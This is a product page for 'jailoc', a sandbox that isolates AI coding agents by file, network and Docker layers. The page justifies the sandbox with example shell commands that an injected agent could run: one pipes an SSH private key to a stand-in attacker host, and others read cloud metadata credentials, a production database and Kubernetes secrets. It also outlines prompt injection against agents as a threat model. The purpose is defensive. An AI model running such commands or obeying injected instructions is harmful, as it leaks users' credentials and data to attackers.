What your agent can reach — right now

Without a sandbox, your coding agent inherits every permission your user account has. It resolves internal DNS, reads your home directory, and talks to every endpoint on your network. One prompt injection — hidden in a GitHub issue, a package README, or a web page — and someone else is at the wheel.

$ psql -h production-db.internal -p 5432 -U app

Your production PostgreSQL at 10.0.35.18. Customer records, payment data, PII — the agent resolves internal DNS and connects without any credentials beyond what's in your .pgpass.

$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

AWS metadata endpoint. One HTTP GET returns IAM credentials with s3:*, ec2:*, rds:*. Works from every EC2 instance. No auth required.

$ cat ~/.ssh/id_ed25519 | curl -d @- https://evil.example.com

Your SSH private key — the one that authenticates to gitlab.corp.internal and every repo in the org. Exfiltrated in one line.

$ curl -k https://k8s.internal:6443/api/v1/namespaces/prod/secrets

43 Kubernetes secrets in plaintext JSON: database connection strings, Stripe API keys, JWT signing material. Your kubeconfig grants access.

This isn't theoretical. Researchers have demonstrated prompt injection exploits against GitHub Copilot, Microsoft 365 Copilot, Amazon Q, Slack AI, and others.

The lethal trifecta

An AI agent becomes exploitable when it combines three capabilities: access to private data, exposure to untrusted content, and ability to communicate externally. Any two are manageable. All three give an attacker a complete exfiltration pipeline.

jailoc cannot break the trifecta entirely — the agent still processes untrusted content from the public internet, because that's its job. What jailoc does is shrink the blast radius by tightening the other two legs.

Based on Simon Willison's The lethal trifecta for AI agents. Read the full Threat Model.

Three layers of isolation

/

File isolation

The agent only sees directories you explicitly mount as workspaces. SSH keys, browser profiles, credentials, other projects — invisible inside the container. Runs as UID 1000 with all Linux capabilities dropped and no_new_privs set.

⟷

Network isolation

Private networks (RFC 1918, link-local, CGNAT) blocked by iptables. Your Kubernetes clusters, databases, and cloud metadata endpoints are unreachable. You allowlist only what the agent needs.

⬡

Docker isolation

Each workspace gets its own Docker daemon via a DinD sidecar. No host socket mounting, no container breakout to the host. Agent-started containers stay inside the sandbox.

What jailoc does not protect against

The agent can still make outbound requests to the public internet. If a prompt injection instructs the agent to exfiltrate workspace source code to an attacker-controlled server, jailoc's network rules will not block it. jailoc protects your internal infrastructure and limits file access — it is not a complete defense against the lethal trifecta.
